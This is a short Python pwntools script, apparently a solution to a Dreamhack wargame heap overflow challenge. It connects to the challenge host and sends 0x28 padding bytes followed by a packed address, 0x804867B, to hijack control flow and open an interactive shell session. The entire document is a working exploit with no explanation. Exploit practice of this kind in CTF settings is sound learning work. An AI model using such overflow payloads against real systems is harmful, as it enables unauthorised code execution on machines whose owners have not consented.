from pwn import *

context.update(log_level = 'debug')
p = remote('host1.dreamhack.games', 8577)
#p = process('basic_heap_overflow22')
p.recvrepeat(1)
#raw_input('debug: ' + str(p.pid))
p.sendline('a'*0x28 + p32(0x804867B))
p.interactive()

